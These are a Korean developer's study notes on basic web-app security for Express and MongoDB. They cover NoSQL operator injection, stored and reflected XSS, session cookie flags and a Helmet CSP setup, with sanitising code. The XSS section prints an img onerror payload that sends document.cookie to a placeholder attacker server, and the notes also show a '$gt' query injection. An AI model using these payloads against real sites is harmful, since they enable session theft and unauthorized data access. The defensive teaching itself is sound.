
아래 내용은 진짜 최소한의 보안 대응에 대해 알려준거고
이것만으로는 부족해서 회사에 보안전담팀이 추가로 이것저것 많이 해야한다고함..


-----------------------------

### 몽고 injection

SQL injection은 SQL DB세계에서는 일반적인 공격방법인데,
입력값에다 파괴적인 쿼리문을 넣어 모든 테이블을 다 날려버린다든가 하는거임ㄷ;
근데 SQL을 쓰는 DB에서만 인젝션 공격을 할수있는게 아님.. 몽고도 가능.

방식 :

예를 들어 아래 코드에 내이름 대신 { '$gt': '' } 를 넣으면
모든유저가 들어있는 리스트를 받게 되고 결과는 항상 참이 됨.

    db.users.find( username: '내이름' )
    db.users.find( username: { '$gt': '' } )


대응 :

사용자가 입력값이 $기호 등을 못 쓰도록 제한하기.
쓸만한 패키지로는 express-mongo-sanitize 가 있는데
req의 body, query, params 에서 $ 와 . 를 걸러줌

    npm i express-mongo-sanitize

    const mongoSanitize = require('express-mongo-sanitize')
    app.use(mongoSanitize())

    혹은 아예 삭제하는게 아니라 특정문자로 대체하도록 옵션을 넣어 use할 수도 있음.

    app.use(mongoSanitize({
        replaceWith: '_';
    }))



### XSS (Cross-Site Scripting)

모든 보안공격의 80% 이상이 XSS라는 통계가 있을 정도로 널렸음;
침입하려는 사이트에 자바스크립트 코드를 심어 실행시키는 기법..
뷰페이지를 로드하는 과정에서 페이지에 포함된 JS코드가 전부 실행되는걸 악용

참고로 CSRF (Cross-Site Request Forgery)와는 다른거임
주로 CSFR를 하려고 XSS를 하므로 비슷하게 느껴질 수 있지만
XSS는 자바스크립트를 실행시키는거고, CSRF는 특정한 행동을 시키는거임.

방식 :

Stored XSS

    이 방식의 예는 사용자가 게시글작성 등의 입력폼에
    스크립트 코드를 넣어 전송하는거다. 서버에 그 코드자체가 저장됨.
    시도할수있는 방법이 매-우 다양함;

  - 매우기초적인 방법은 script태그를 직접 넣는거임..
    글제목을 이렇게 해서 올리면 이제 저 글 페이지에 접속하는 사람들은 저런 알림창을 보게됨;

        <script>alert('Fxxk you!')</script> 

  - 이미지태그src나 이벤트속성을 쓰는방법도 있음
    내가 해커라고 치고 먼저 해킹용서버,페이지를 만들어놓자. 그다음
    쿠키를 훔치고싶은 사이트의 게시판 등에 아래와같은 이미지 태그를 넣어 글작성.

        <img src="#" onerror="location.href('http://해킹용서버/쿠키내놔?cookie=' + document.cookie);">

    이제 이 페이지로 누군가 오면 저 이미지를 로드 시도하다가 저 주소로 이동하게 됨
    근데 저 url을 보면 그사람의 쿠키정보를 쿼리에 넣어 요청하게 해놨음..
    이런 식으로 쿠키/세션정보 같은 걸 털수있는거임

Reflected XSS

    이 방식은 보통 URL파라미터(특히 GET)에 스크립트를 넣어
    서버에 저장되지 않고 즉시 스크립트가 실행되게 함.
    브라우저 자체에서 차단하는 경우가 많아 상대적으로 성공 어려움.


대응 :

Stored XSS에 대응하기 위해..
텍스트입력폼에 HTML코드를 작성할 수 없도록 제한하자.

  - express-validator 이용

    express-validator 패키지 깔면 joi처럼 유효성검사도 해주고
    데이터sanitizing과 HTML이스케이핑 기능도 제공.

        npm i express-validator

        const { query, validationResult } = require('express-validator');

        app.use(express.json());
        app.get('/hello', query('person').notEmpty().escape(), (req, res) => {    // 미들웨어자리에 저렇게 넣어줌.
            const result = validationResult(req);
            if (result.isEmpty()) {
                return res.send(`Hello, ${req.query.person}!`);     // 검증할데이터가 쿼리스트링의 person값.
            }
            res.send({ errors: result.array() });
        });

    자세한 내용과 더 많은 기능은
    https://express-validator.github.io/docs/guides/getting-started 참고.



  - 또는 joi + sanitize-html 이용

    joi에는 HTML이스케이핑 기능이 없지만, 조이는 확장성이 좋아서
    내가 직접 HTML이스케이핑 규칙을 만들어 조이스키마에서 쓸수있음
    (validationSchemas.js 파일 참고)

    규칙 작성하는 데에는 sanitize-html 패키지를 썼음.

        npm i sanitize-html
        const sanitizeHTML = require('sanitize-html')



### 쿠키/세션 설정

app.js에 작성한 sessionConfig 말하는거임..

httpOnly: true
로 설정하면, 클라측 스크립트로 쿠키접근 못하게 제한가능.
만약 해커가 크로스사이트스크립팅 결함을 이용해 어떤사용자를
쿠키/세션정보요구하는 나쁜URL로 유인해도 브라우저가 서드파티에 쿠키를 노출하지 않음

secure: true
이건 나중에 배포시에는 https로만 액세스하게 해야할테니 필요하겠지만
지금 당장 내 앱에 적용하면 문제생김..

name: 'connect.sid를대체할만한너무간단하지않은이름'
원래 기본적으로 connect.sid라는 이름의 쿠키가 사용되는데
이걸 불특정다수의 쿠키/세션을 노린 공격으로부터 조금이나마 보호하기 위해
디폴트 쿠키이름을 다른걸로 설정해두는거임.



### 보안 라이브러리 Helmet.js

인기많은 보안패키지 헬멧을 써보자. 
10개넘는 미들웨어로 사용할 수 있는데 전부 HTTP헤더에 대한 내용임
https://helmetjs.github.io/ 참고

    npm i helmet

    const helmet = require('helmet')
    app.use(helmet())

그런데 이상태로 실행해보면 contentSecurityPolicy 미들웨어 때문에
부트스트랩 Splash Mapbox 전부 로딩 실패 뜸..
(그래서 임시로 helmet({ contentSecurityPolicy: false })로 use함)

CSP (Content Security Policy) 설정은
위에서 얘기한 크로스사이트 스크립팅에 대응할 수 있는 방법중 하나임.
내 웹사이트에서 각종데이터들의 출처로 사용할수있는 URL 등을 미리 지정해두고
그 이외의 곳으로 요청보내려고 하면 막고 오류띄워줌.

디폴트는 아래와 같음

    default-src 'self';
    base-uri 'self';
    font-src 'self' https: data:;
    form-action 'self';
    frame-ancestors 'self';
    img-src 'self' data:;
    object-src 'none';
    script-src 'self';
    script-src-attr 'none';
    style-src 'self' https: 'unsafe-inline';
    upgrade-insecure-requests

이걸 내가 사용하고있는 서비스들에 맞게 수정해줘야 함.
아래는 내가 브라우저콘솔에 뜨는 오류메시지 하나하나 보고 채워넣은거임 -_-...아오
맵박스Docs 뒤져보니까 CSP 설정에 관한 내용도 있어서 참고했음.

    app.use(helmet({
        contentSecurityPolicy: {
            useDefaults: false,
            directives: {
                defaultSrc: ["'self'"],
                scriptSrc: ["'self'", "'unsafe-inline'", "https://api.mapbox.com", "https://stackpath.bootstrapcdn.com", "https://cdn.jsdelivr.net"],
                objectSrc: ["'none'"],
                styleSrc: ["'self'", "'unsafe-inline'", "https://stackpath.bootstrapcdn.com", "https://fonts.googleapis.com"],
                styleSrcElem: ["'self'", "https://api.mapbox.com", "https://cdn.jsdelivr.net", "https://fonts.googleapis.com"],
                workerSrc: ["blob:"],
                connectSrc: ["'self'", "https://*.tiles.mapbox.com", "https://api.mapbox.com", "https://events.mapbox.com"],
                imgSrc: ["'self'", "blob:", "data:", "https://res.cloudinary.com"],
                fontSrc: ["'self'", "https://fonts.gstatic.com"],
                upgradeInsecureRequests: [],
            },
        },
    }))

